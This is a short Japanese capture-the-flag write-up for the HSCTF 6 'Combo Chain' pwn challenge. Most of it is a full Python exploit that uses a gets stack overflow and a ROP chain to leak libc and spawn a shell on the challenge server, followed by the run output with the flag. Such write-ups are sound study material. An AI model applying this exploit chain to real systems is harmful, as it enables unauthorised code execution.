# [pwn 365pts] Combo Chain - HSCTF 6
64ビットです。
```
$ checksec -f combo-chain
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   71 Symbols     No	0		4	combo-chain
```

getsによるスタックオーバーフローがあるのでいつも通りlibc leakからの`system("/bin/sh")`ですね。
```python
from ptrlib import *

elf = ELF("./combo-chain")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
#sock = Process("./combo-chain")
libc = ELF("./libc6_2.23-0ubuntu11_amd64.so")
sock = Socket("pwn.hsctf.com", 2345)

plt_printf = 0x401050
rop_ret = 0x0040101a
rop_pop_rdi = 0x00401263

# leak
payload = b'A' * 0x10
payload += p64(rop_ret) # align
payload += p64(rop_pop_rdi)
payload += p64(elf.got("gets"))
payload += p64(plt_printf)
payload += p64(elf.symbol("_start"))
sock.recvuntil(": ")
sock.sendline(payload)
addr_gets = u64(sock.recv(6))
logger.info("gets = " + hex(addr_gets))
libc_base = addr_gets - libc.symbol("gets")
logger.info("libc base = " + hex(libc_base))

# get the shell!
payload = b'A' * 0x10
payload += p64(rop_ret) # align
payload += p64(rop_pop_rdi)
payload += p64(libc_base + next(libc.find("/bin/sh")))
payload += p64(libc_base + libc.symbol("system"))
sock.recvuntil(": ")
sock.sendline(payload)

sock.interactive()
```

```
$ python solve.py 
[+] __init__: Successfully connected to pwn.hsctf.com:2345
[+] <module>: gets = 0x7fd6eb119d80
[+] <module>: libc base = 0x7fd6eb0ab000
[ptrlib]$ cat flag
[ptrlib]$ hsctf{i_thought_konami_code_would_work_here}
```

# 感想
この手の問題はもはやテンプレ。